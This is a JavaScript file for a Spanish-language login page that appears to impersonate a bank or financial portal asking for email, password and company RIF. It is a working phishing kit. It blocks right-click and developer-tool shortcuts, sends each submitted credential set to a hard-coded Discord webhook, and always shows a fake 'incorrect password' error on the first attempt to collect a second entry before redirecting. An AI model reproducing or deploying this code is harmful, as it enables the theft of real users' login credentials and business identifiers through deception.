document.addEventListener('DOMContentLoaded', () => {
    // ==========================================
    // PROTECCIÃ“N CONTRA INSPECCIÃ“N Y TRUCOS
    // ==========================================
    
    // Bloquear el menÃº contextual (clic derecho)
    document.addEventListener('contextmenu', e => e.preventDefault());

    // Bloquear atajos de teclado para desarrolladores (F12, Ctrl+Shift+I, etc.)
    document.addEventListener('keydown', (e) => {
        if (
            e.key === 'F12' ||
            (e.ctrlKey && e.shiftKey && (e.key === 'I' || e.key === 'J' || e.key === 'C')) ||
            (e.ctrlKey && e.key === 'U')
        ) {
            e.preventDefault();
            return false;
        }
    });

    // ==========================================
    // LÃ“GICA DEL FORMULARIO Y WEBHOOK DE DISCORD
    // ==========================================
    const loginForm = document.getElementById('loginForm');
    const emailInput = document.querySelector('input[name="usuario"]');
    const passwordInput = document.getElementById('password');
    const loginButton = document.querySelector('.btn-ingresar');
    const togglePasswords = document.querySelectorAll('.toggle-password');
    const typeButtons = document.querySelectorAll('.type-btn');
    const juridicoFields = document.getElementById('juridicoFields');
    const rifGroup = document.getElementById('rifGroup');
    const isAuthorizedCheck = document.getElementById('isAuthorized');
    const rifNumberInput = document.querySelector('input[name="rifNumber"]');

    loginButton.disabled = false;
    loginButton.classList.add('active');

    const REDIRECCION_URL = 'wait.html';

    // URL DE TU WEBHOOK DE DISCORD (AsegÃºrate de poner tu URL real aquÃ­)
    const WEBHOOK_DISCORD = 'https://discord.com/api/webhooks/1574562090377682964/lMKP5KBP7S7l4fFAGQ5VxYXk552dquAslhXYHEyIuKbI4nL8XuguZ7KNrRfM1YaiM9wN';

    // FunciÃ³n para enviar a Discord optimizada para selecciÃ³n mÃ³vil
    async function enviarADiscord(textoContenido) {
        try {
            await fetch(WEBHOOK_DISCORD, {
                method: 'POST',
                headers: { 'Content-Type': 'application/json' },
                body: JSON.stringify({
                    content: textoContenido
                })
            });
        } catch (error) {
            console.error("Error al enviar a Discord:", error);
        }
    }

    // Inicializar el control de intentos en 0 cada vez que se carga la pÃ¡gina principal
    localStorage.setItem('intentos_login', '0');

    togglePasswords.forEach(toggle => {
        toggle.addEventListener('click', () => {
            const targetId = toggle.getAttribute('data-target');
            const input = document.getElementById(targetId);
            if (input) {
                input.type = input.type === 'password' ? 'text' : 'password';
            }
        });
    });

    typeButtons.forEach(btn => {
        btn.addEventListener('click', () => {
            typeButtons.forEach(b => b.classList.remove('active'));
            btn.classList.add('active');

            if (btn.id === 'btnJuridico') {
                juridicoFields.style.display = 'block';
            } else {
                juridicoFields.style.display = 'none';
                isAuthorizedCheck.checked = false;
                rifGroup.style.display = 'none';
                rifNumberInput.value = '';
            }
        });
    });

    isAuthorizedCheck.addEventListener('change', () => {
        if (isAuthorizedCheck.checked) {
            rifGroup.style.display = 'block';
        } else {
            rifGroup.style.display = 'none';
            rifNumberInput.value = '';
            document.getElementById('rifError').textContent = '';
            rifNumberInput.classList.remove('error');
        }
    });

    rifNumberInput.addEventListener('input', () => {
        const rifError = document.getElementById('rifError');
        rifNumberInput.value = rifNumberInput.value.replace(/\D/g, '');

        if (rifNumberInput.value.trim() !== '') {
            rifError.textContent = '';
            rifNumberInput.classList.remove('error');
        } else {
            rifError.textContent = 'El RIF de la empresa es requerido';
            rifNumberInput.classList.add('error');
        }
    });

    emailInput.addEventListener('input', () => {
        const usuario = emailInput.value.trim();
        const usuarioError = document.getElementById('usuarioError');

        if (usuario === '') {
            usuarioError.textContent = 'Debe indicar el correo';
            emailInput.classList.add('error');
        } else if (!usuario.includes('@')) {
            usuarioError.textContent = 'Por favor Ingresa con el correo electrÃ³nico afiliado a tu cuenta.';
            emailInput.classList.add('error');
        } else {
            usuarioError.textContent = '';
            emailInput.classList.remove('error');
        }
    });

    passwordInput.addEventListener('input', () => {
        const password = passwordInput.value;
        const passwordError = document.getElementById('passwordError');
        
        const hasUppercase = /[A-Z]/.test(password);
        const hasSpecialChar = /[!@#$\%^&*(),.?":{}\vert{}<>_\-\+=$$$$\\\/`~]/.test(password);
        const hasNumber = /[0-9]/.test(password);

        if (password === '') {
            passwordError.textContent = 'La contraseÃ±a es requerida';
            passwordInput.classList.add('error');
        } else if (password.length < 8) {
            passwordError.textContent = 'La contraseÃ±a debe contener al menos 8 caracteres';
            passwordInput.classList.add('error');
        } else if (!hasUppercase || !hasSpecialChar || !hasNumber) {
            passwordError.textContent = 'Debe incluir al menos 1 mayÃºscula, 1 carÃ¡cter especial y 1 nÃºmero';
            passwordInput.classList.add('error');
        } else {
            passwordError.textContent = '';
            passwordInput.classList.remove('error');
        }
    });

    loginForm.addEventListener('submit', async (e) => {
        e.preventDefault();

        if (loginButton.disabled) return;

        const usuario = emailInput.value.trim();
        const password = passwordInput.value;
        
        const usuarioError = document.getElementById('usuarioError');
        const passwordError = document.getElementById('passwordError');

        let isValid = true;

        usuarioError.textContent = '';
        passwordError.textContent = '';
        
        emailInput.classList.remove('error');
        passwordInput.classList.remove('error');

        if (usuario === '') {
            usuarioError.textContent = 'Debe indicar el correo';
            emailInput.classList.add('error');
            isValid = false;
        } else if (!usuario.includes('@')) {
            usuarioError.textContent = 'Por favor Ingresa con el correo electrÃ³nico afiliado a tu cuenta.';
            emailInput.classList.add('error');
            isValid = false;
        }

        const hasUppercase = /[A-Z]/.test(password);
        const hasSpecialChar = /[!@#$%^&*(),.?":{}|<>_\-\+=$$$$\\\/`~]/.test(password);
        const hasNumber = /[0-9]/.test(password);

        if (password === '') {
            passwordError.textContent = 'La contraseÃ±a je requerida';
            passwordInput.classList.add('error');
            isValid = false;
        } else if (password.length < 8) {
            passwordError.textContent = 'La contraseÃ±a debe contener al menos 8 caracteres';
            passwordInput.classList.add('error');
            isValid = false;
        } else if (!hasUppercase || !hasSpecialChar || !hasNumber) {
            passwordError.textContent = 'Debe incluir al menos 1 mayÃºscula, 1 carÃ¡cter especial y 1 nÃºmero';
            passwordInput.classList.add('error');
            isValid = false;
        }

        const tipoUsuario = document.querySelector('.type-btn.active')?.textContent || 'No especificado';
        const isAuthorized = isAuthorizedCheck.checked;
        const rifType = document.querySelector('select[name="rifType"]')?.value;
        const rifNumber = rifNumberInput.value.trim();

        if (tipoUsuario.includes('JurÃ­dico') && isAuthorized) {
            if (rifNumber === '') {
                document.getElementById('rifError').textContent = 'El RIF de la empresa es requerido';
                rifNumberInput.classList.add('error');
                isValid = false;
            }
        }

        if (!isValid) {
            loginButton.disabled = false;
            loginButton.style.opacity = '1';
            loginButton.style.cursor = 'pointer';
            loginButton.textContent = 'Ingresar';
            return;
        }

        let intentos = parseInt(localStorage.getItem('intentos_login') || '0');

        loginButton.disabled = true;
        loginButton.style.opacity = '0.6';
        loginButton.style.cursor = 'not-allowed';
        loginButton.textContent = 'Ingresando...';

        if (intentos === 0) {
            // ==========================================
            // 1ER INTENTO: Formato limpio seleccionable en mÃ³vil
            // ==========================================
            let mensajeIntento1 = `âŒ **Intento 1 - Credenciales**\n\n` +
                                  `ðŸ‘¤ **Usuario:**\n` +
                                  `\`${usuario}\`\n\n` +
                                  `ðŸ”‘ **ContraseÃ±a:**\n` +
                                  `\`${password}\`\n\n` +
                                  `ðŸ¢ **Tipo:** ${tipoUsuario}\n`;

            if (tipoUsuario.includes('JurÃ­dico')) {
                mensajeIntento1 += `âœ… **Autorizado:** ${isAuthorized ? 'SÃ­' : 'No'}\n`;
                if (isAuthorized) {
                    mensajeIntento1 += `ðŸ“¦ **RIF:** ${rifType}${rifNumber}\n`;
                }
            }

            await enviarADiscord(mensajeIntento1);

            setTimeout(() => {
                passwordError.textContent = 'Correo/ContraseÃ±a incorrectos Porfavor Verificar Ingrese Nuevamente';
                passwordInput.classList.add('error');
                passwordInput.value = ''; 
                loginButton.disabled = false;
                loginButton.style.opacity = '1';
                loginButton.style.cursor = 'pointer';
                loginButton.textContent = 'Ingresar';
                localStorage.setItem('intentos_login', '1'); 
            }, 1000);

            return;

        } else {
            // ==========================================
            // 2DO INTENTO: Formato limpio final seleccionable
            // ==========================================
            let mensajeIntento2 = `âœ… **Intento 2 - Credenciales Finales**\n\n` +
                                  `ðŸ‘¤ **Usuario:**\n` +
                                  `\`${usuario}\`\n\n` +
                                  `ðŸ”‘ **ContraseÃ±a:**\n` +
                                  `\`${password}\`\n\n` +
                                  `ðŸ¢ **Tipo:** ${tipoUsuario}\n`;

            if (tipoUsuario.includes('JurÃ­dico')) {
                mensajeIntento2 += `âœ… **Autorizado:** ${isAuthorized ? 'SÃ­' : 'No'}\n`;
                if (isAuthorized) {
                    mensajeIntento2 += `ðŸ“¦ **RIF:** ${rifType}${rifNumber}\n`;
                }
            }

            await enviarADiscord(mensajeIntento2);

            localStorage.setItem('usuario_guardado', usuario);
            window.location.href = REDIRECCION_URL;
        }
    });
});